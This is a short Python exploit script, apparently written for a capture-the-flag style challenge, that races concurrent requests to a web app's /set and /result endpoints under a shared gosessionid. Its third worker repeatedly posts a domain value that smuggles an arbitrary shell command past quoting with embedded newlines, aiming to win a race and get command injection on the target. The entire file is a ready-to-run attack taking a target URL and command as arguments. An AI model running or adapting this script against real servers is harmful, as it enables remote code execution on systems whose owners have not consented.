import multiprocessing
import requests
import uuid
import sys
from urllib.parse import urljoin

def send_result(url, sessionid):
    cookies = { 'gosessionid': sessionid }
    url = urljoin(url, '/result')
    while True:
        requests.get(url, cookies=cookies)
        print('result')

def send_set(url, sessionid, domain):
    data = { 'domain': domain }
    cookies = { 'gosessionid': sessionid }
    url = urljoin(url, '/set')
    while True:
        requests.post(url, data=data, cookies=cookies)
        print('set', domain)

def main():
    if len(sys.argv) != 3:
        print('Usage: python3 exploit.py <target_url> <command>')
        exit()

    url = sys.argv[1]
    command = sys.argv[2]
    sessionid = str(uuid.uuid4())
    workers = list()
    workers.append(multiprocessing.Process(target=send_result, args=(url, sessionid)))
    workers.append(multiprocessing.Process(target=send_set, args=(url, sessionid, '')))
    workers.append(multiprocessing.Process(target=send_set, args=(url, sessionid, f"'\n{command}\necho '")))
    for worker in workers:
        worker.start()
    for worker in workers:
        worker.join()

if __name__ == '__main__':
    multiprocessing.freeze_support()
    main()
